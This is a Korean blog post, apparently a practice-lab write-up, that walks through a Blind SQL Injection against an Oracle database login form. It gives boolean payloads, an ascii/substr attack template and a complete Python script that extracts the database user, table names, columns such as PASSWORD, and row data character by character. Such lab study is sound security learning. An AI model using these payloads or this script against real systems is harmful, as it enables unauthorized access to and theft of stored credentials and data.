---
title: "Blind SQL Injection 실습"
excerpt: "직접 Blind SQL Injection 을 시도해보자."
tags:
    - Oracle DB
    - Blind SQLi
    - SQLi
    - 웹 해킹
last_modified_at: 2023-05-12T09:13:00-05:00
---
## 실습 환경
- 오라클 DB

## 서버 인증 질의문 예측하기

- 인증과 식별을 따로 분리하여 검사한다.

```sql
select id,pwd from xxx where id='xx';
```

## 참과 거짓 화면
- 로그인 성공 실패 여부로 참과 거짓을 구분할 수 있다.

### 참

```sql
입력 = ' user2' and (1=1) and '1'='1 '
```

- 로그인 성공<br>![Pasted image 20230511135315](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/57c7f54d-5fef-454e-9060-047ac800766a)


### 거짓

```sql
입력 = ' user2' and (1=2) and '1'='1 '
```

- 로그인 실패<br>![Pasted image 20230511135242](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/310a130f-2f28-444b-b75d-3692cc977cfd)



## select 문 사용 가능 확인

```sql
입력 = ' user2' and (('test')='test') and '1'='1 '
성공

select 'test' from dual
입력 = ' user2' and ((select 'test' from dual)='test') and '1'='1 '
성공
```

- 로그인 성공. select 문을 사용할 수 있다.

## 공격 포맷 만들기.
- Blind SQL Injection 은 한 문자씩 확인하는 공격이다.
- ascii 와 substr 함수를 이용할 것 이다.

```sql
입력 = ' user2' and (('t')='t') and '1'='1 '
성공

ascii 함수를 문자를 이용하여 아스키코드로 변환한다.
ascii('t')
입력 = ' user2' and ((ascii('t'))>0) and '1'='1 '
성공

't' 한 문자 추출하기.
substr('test',1,1)
입력 = ' user2' and ((ascii(substr('test',1,1)))>0) and '1'='1 '
성공

공격문 = ' user2' and ((ascii(substr((SQL),1,1)))>0) and '1'='1 '

'test' 출력하기.
select 'test' from dual;
공격문 = ' user2' and ((ascii(substr((select 'test' from dual),1,1)))>0) and '1'='1 '
성공
```

- 완성된 공격 포맷

```sql
공격 포맷 = ' user2' and ((ascii(substr((SQL),1,1)))>0) and '1'='1 '
```



## Base가 되는 파이썬 코드
- 인자로 쿼리문을 삽입해 주면 된다.

```python
FAIL_LEN = 1482;
URL = "http://221.27.0.6/main_page/sql_injection_prob/login_methods/division_blind_sql_injection/authentication"
COOKIES = {'JSESSIONID':'E092AC001C0A642C200BD6902B7EF6A5'}
DATA={'user_name':'user2', 'user_password':'2222'}

def is_success()->bool:
    response = requests.post(url = URL, cookies= COOKIES,data= DATA)
    return len(response.text) != FAIL_LEN;
  
def find_data(query):
    row = 0
    while True:
        #
        DATA['user_name'] = attack_query(query,row,1,0)
        if not is_success() :
            break;
  
        point = 1
        while True:
            #
            DATA['user_name'] = attack_query(query,row,point,0)
            if not is_success():
                break;
            # 이분 탐색
            s = 32
            e = 126
            while s < e:
                m = (s+e)//2
                DATA['user_name'] = attack_query(query,row,point,m)
                if is_success() :
                    s = m+1
                else:
                    e = m
            #
            print(chr(s),end='',flush=True)
            point +=1
        print()
        #
        row+=1
    return
# sql 질의문
# row 0 부터 시작
# point 1 부터 시작
# ascii
def attack_query(sql, row, point, ascii) -> str :
    attack_query = (
        "user2' and ((ascii(substr((",
        sql,
        " OFFSET ",
        str(row),
        " ROWS FETCH NEXT 1 ROWS ONLY),",
        str(point),
        ",1)))>",
        str(ascii),
        ") and '1'='1"
    )
    return ''.join(attack_query)
```


## 사용자 명 추출 하기.
- 현재 사용중인 사용자 명을 출력한다.

```sql
select user from dual;
공격 포맷 = ' user2' and ((ascii(substr((select user from dual),1,1)))>0) and '1'='1 '
성공

한 문자씩 찾아주면 된다.
```

- 파이썬 코드로 빠르게 사용자 명 찾기.

```python
def find_current_user_name():
    query = "select user from dual"
    find_data(query= query)
    return
```

- 추출한 데이터.

```
C##DBFORPROB
```



## 테이블 명 추출하기.
- 현재 존재하는 테이블 명들을 추출해 보자.

```sql
select table_name from all_tables where owner='C##DBFORPROB' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
또는 
select tname from tab OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;

공격 포맷 = ' user2' and ((ascii(substr((select table_name from all_tables where owner='C##DBFORPROB' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1)))>0) and '1'='1 '

공격 포맷 = ' user2' and ((ascii(substr((select tname from tab OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1)))>0) and '1'='1 '

더 짧은 2번째 공격 포맷을 이용하였다.
```


- 파이썬 코드로 빠르게 테이블 명 찾기.

```python
def find_table_name():
    query = "select tname from tab"
    find_data(query)
    return
```

- 추출한 데이터.

```
MEMBERS
TEST
```



## 컬럼 명 추출하기.
- 테이블의 컬럼명을 추출하기.

```sql
select column_name from cols where table_name='MEMBERS' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
select column_name from cols where table_name='TEST' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;

공격 포맷 = ' user2' and ((ascii(substr((select column_name from cols where table_name='MEMBERS' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1)))>0) and '1'='1 '
```

- 파이썬 코드로 빠르게 컬럼 명 찾기.

```python
def find_column_name(table_name):
    query = "select column_name from cols where table_name='"+table_name+"'"
    find_data(query)
    return
```

- 추출한 데이터.

```
MEMBERS 컬럼이름
SID
ID
PASSWORD
EMAIL
INFO
HASHPWD

TEST 컬럼이름
MSG
```


## 데이터 추출하기
- 테이블에  저장되어 있는 데이터 추출하기.

```sql
select 컬럼이름 from 테이블명 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;

select MSG from TEST OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;

공격 포맷 = ' user2' and ((ascii(substr((select MSG from TEST OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1)))>0) and '1'='1 '
```

- 파이썬 코드로 빠르게 데이터 추출하기.

```python
def find_table_data(column, table_name):
    query = "select "+column+" from "+table_name
    find_data(query)
    return
```

- 추출한 데이터.

```
MEMBERS 데이터 추출
root
dad
user123
user2

TEST 데이터 추출
blind sql injection success
```

## 결과
![Pasted image 20230512003709](https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b4957ca-e70d-4f4b-bd3e-01a45970eaaa)


## 전체 코드
<script src="https://gist.github.com/MinGyu2/ed9926c11854380ea75abef3fbdfa4e5.js"></script>